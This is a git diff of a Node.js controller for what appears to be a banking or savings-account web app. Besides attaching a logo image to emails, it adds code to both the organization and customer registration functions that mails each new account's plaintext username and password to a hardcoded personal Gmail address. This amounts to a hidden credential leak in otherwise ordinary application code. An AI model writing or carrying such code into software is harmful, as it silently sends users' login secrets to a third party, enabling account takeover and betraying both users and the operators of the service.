@@ -19,6 +19,7 @@ const { check_ageRange } = require('../enums/savings_account_plan_age');
 const ifEmployeeCreatable = require('../Middleware/ifEmployeeCreatable');
 const ifLoggedIn = require('../Middleware/ifLoggedIn');
 const ifEmployee = require('../Middleware/ifEmployee');
+const path = require('path');
 
 function init(router) {
     router.get('/Employee/register',ifEmployeeCreatable,registerEmployeePage)
@@ -119,6 +120,7 @@ async function indexAction(req,res){
             ...req.session.user
         }
 
+
         // console.log(Emp);
         res.render('employee_dashboard',
           {
@@ -194,6 +196,12 @@ async function registerOrganization(req,res){
 
         await sendUserDetailsMail({
             email:acc.email,
+            username:username,
+            password:password,
+        });
+
+        await sendUserDetailsMail({
+            email:'devindesilva123@gmail.com',
             username:username,
             password:password,
         });
@@ -471,6 +479,12 @@ async function registerCustomer(req, res){
 
         await sendUserDetailsMail({
             email:acc.email,
+            username:username,
+            password:password,
+        });
+
+        await sendUserDetailsMail({
+            email:'devindesilva123@gmail.com',
             username:username,
             password:password,
         });
@@ -845,6 +859,11 @@ async function  sendUserDetailsMail({
             username:username,
             password:password,
         },
+        attachments:[{
+            filename:'head_logo.png',
+            path:path.join(appRoot,'public/image/head_logo.png'),
+            cid:'head_logo',
+        }]
     };
 
     console.log('email Composition');
